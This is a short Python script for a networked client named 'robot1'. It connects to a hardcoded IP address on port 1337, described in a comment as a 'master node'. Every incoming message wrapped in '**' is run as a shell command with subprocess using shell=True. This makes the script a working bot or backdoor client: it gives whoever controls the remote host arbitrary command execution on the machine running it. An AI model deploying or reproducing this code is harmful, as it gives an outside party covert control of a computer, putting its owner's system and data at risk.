from __future__ import print_function

import asyncore
import collections
import re
from subprocess import call
import logging
import socket


MAX_MESSAGE_LENGTH = 1024

class Client(asyncore.dispatcher):

    def __init__(self, host_address, name):
        asyncore.dispatcher.__init__(self)
        self.log = logging.getLogger('Client (%7s)' % name)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.name = name
        self.log.info('Connecting to host at %s', host_address)
        self.connect(host_address)
        self.outbox = collections.deque()

    # open up shell and execute prompt
    def execute_prompt(self, cmd):
        call(cmd, shell=True)

    # prep message for sending
    def say(self, message):
        self.outbox.append(message)
        self.log.info('Enqueued message: %s', message)

    # called when data is being sent
    def handle_write(self):
        if not self.outbox:
            return
        message = self.outbox.popleft()
        if len(message) > MAX_MESSAGE_LENGTH:
            raise ValueError('Message too long')
        self.send(message)

    # called when data is received
    def handle_read(self):
        message = self.recv(MAX_MESSAGE_LENGTH)
        if message.startswith('||'):
            self.log.info('INCOMING TRANSFER')
            self.log.info('Received message: %s', message)
        elif message.startswith('**'):
            self.log.info('COMMAND PROMPT')
            self.log.info('Received message: %s', message)
            cmd = message[2:-2]
            logging.info(cmd)
            self.execute_prompt(cmd)
        else:
            self.log.info('Received message: %s', message)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    logging.info('Creating client')
    # change IP to your master node's machine IP and port
    alice = Client(('174.129.126.220',1337),'robot1')
    # alice.say('Hello, everybody!')
    asyncore.loop()